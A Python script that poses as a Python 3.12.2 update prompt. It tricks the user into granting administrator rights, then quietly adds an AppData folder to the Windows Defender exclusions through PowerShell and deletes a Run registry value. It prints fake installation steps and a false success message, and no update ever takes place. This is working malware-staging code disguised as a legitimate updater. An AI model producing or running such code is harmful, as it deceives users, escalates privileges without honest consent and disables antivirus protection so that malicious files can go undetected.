from math import e
import os
import pathlib as pl
import random
import re
import sys
import ctypes
import time

is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0

class Main:
    def __init__(self):
        pass
    
    def send_update_notification(self):
        install_input = input("A new version of Python is available: 3.12.2"+
                            "\nYou are currently using: 3.11.6"+
                            "\nPress 'Y' or 'Enter' to update or 'N' to skip: ")
        return install_input.strip().lower() in ['y', '']

    def request_admin_privileges(self) -> bool:
        return ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1) > 32

    def add_folder_to_windows_defender_exclusions(self):
        folder_path = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
        command = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{folder_path}\""'
        os.system(command)
    
    def perform_update(self):
        steps = [
            "Resolving dependencies...",
            "Downloading package metadata...",
            "Installing collected packages...",
            "Applying security patches...",
            "Finalizing installation..."
        ]

        for step in steps:
            print(step)
            time.sleep(random.uniform(1, 4.5)) # Simulate time taken for each step

        print("\nSuccessfully installed updates.")
        print("Current version: 3.11.6")
        print("Updated to: 3.12.2")
        print("Restart may be required.")
        time.sleep(2)
        exit(0)

    def remove_hkey(self):
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            key = winreg.OpenKey(  # type: ignore
                winreg.HKEY_CURRENT_USER,  # type: ignore
                key_path,
                0,
                winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
            )
            time.sleep(1)
            print(key)
            # Alten Wert löschen, falls vorhanden
            try:
                winreg.DeleteValue(key, "main")  # type: ignore
            except Exception as e:
                print(f"{e}")
                time.sleep(2)
        except Exception as e:
            print(f"Registry Fehler: {e}")

if __name__ == "__main__":
    self = Main()
    if is_admin:
        print("Gathering dependencies and preparing for update...")
        self.add_folder_to_windows_defender_exclusions()
        self.remove_hkey() #321
        self.perform_update()
        exit(0)
    if self.send_update_notification():
        print("Updating Python...")
        time.sleep(1)
        if self.request_admin_privileges():
            exit(0)
        else:
            print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
            time.sleep(2)
    else:
        print("Update skipped.")